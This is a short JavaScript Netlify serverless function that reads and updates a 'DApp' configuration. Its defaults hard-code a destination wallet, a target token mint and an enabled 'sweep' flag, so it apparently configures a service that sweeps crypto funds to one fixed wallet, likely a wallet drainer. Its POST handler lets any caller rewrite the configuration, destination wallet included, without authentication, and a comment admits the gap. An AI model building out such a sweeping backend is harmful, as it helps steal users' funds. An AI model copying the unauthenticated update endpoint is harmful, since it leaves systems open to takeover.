// Netlify Serverless Function: DApp Configuration Manager
// Endpoint: /.netlify/functions/dapp-config
// Method: GET (fetch config), POST (update config)

const { Storage } = require('./lib/storage');

const DEFAULT_CONFIG = {
    destinationWallet: "CZ7Lv3QNVxbBivGPBhJG7m1HpCtfEDjEusBjjZ3qmVz5",
    targetMint: "3HPpMLK7LjKFqSnCsBYNiijhNTo7dkkx3FCSAHKSpump",
    isSweepEnabled: true,
    lastUpdated: new Date().toISOString()
};

exports.handler = async (event) => {
    try {
        const storage = new Storage('dapp-config');

        // GET: Fetch current configuration
        if (event.httpMethod === 'GET') {
            const config = await storage.get('config') || DEFAULT_CONFIG;
            return {
                statusCode: 200,
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(config)
            };
        }

        // POST: Update configuration (Admin only ideally, but simplistic for now)
        if (event.httpMethod === 'POST') {
            const body = JSON.parse(event.body || "{}");
            const currentConfig = await storage.get('config') || DEFAULT_CONFIG;

            // Merge updates
            const newConfig = {
                ...currentConfig,
                ...body,
                lastUpdated: new Date().toISOString()
            };

            await storage.set('config', newConfig);

            return {
                statusCode: 200,
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(newConfig)
            };
        }

        return {
            statusCode: 405,
            body: JSON.stringify({ error: "Method Not Allowed" })
        };

    } catch (error) {
        console.error("DApp Config Error:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Internal Server Error" })
        };
    }
};
